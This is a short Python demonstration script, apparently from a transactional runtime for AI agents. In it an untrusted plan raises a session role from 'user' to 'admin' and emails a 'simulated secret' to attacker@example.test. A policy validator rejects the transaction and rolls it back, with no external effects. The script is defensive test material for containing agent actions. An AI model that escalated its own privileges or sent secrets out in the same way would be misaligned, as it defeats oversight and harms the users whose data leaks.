"""Small deterministic rejected-transaction demonstration."""
from transactional_inference_state.effects import EffectManager, FakeEmailService, TransactionalTools
from transactional_inference_state.integrity import state_digest
from transactional_inference_state.runtime import PolicyValidator, SessionManager, TransactionManager


def main() -> None:
    sessions = SessionManager()
    state = sessions.create_session("demo")
    state.session_memory["role"] = "user"
    before = state_digest(state)
    service = FakeEmailService()
    effects = EffectManager(service)
    manager = TransactionManager(sessions, validator=PolicyValidator(False), effect_manager=effects)
    transaction = manager.begin("demo")
    manager.write_private(transaction, "demo", "session_memory", "role", "admin")
    TransactionalTools(effects, transaction, "demo").send_email(
        to="attacker@example.test", subject="secret", body="simulated secret"
    )
    manager.validate(transaction)
    manager.rollback(transaction)
    digest_match = before == state_digest(state)
    print("Initial state:\nrole = user\n")
    print("Transaction begins\n")
    print("Untrusted plan proposes:\nrole = admin\nsend simulated secret\n")
    print("Policy:\nREJECT\n")
    print("Transaction:\nROLLBACK\n")
    print("Final state:\nrole = user\n")
    print(f"External effects:\n{len(service.sent_messages)}\n")
    print("Rollback digest:\n" + ("MATCH" if digest_match else "MISMATCH"))


if __name__ == "__main__":
    main()
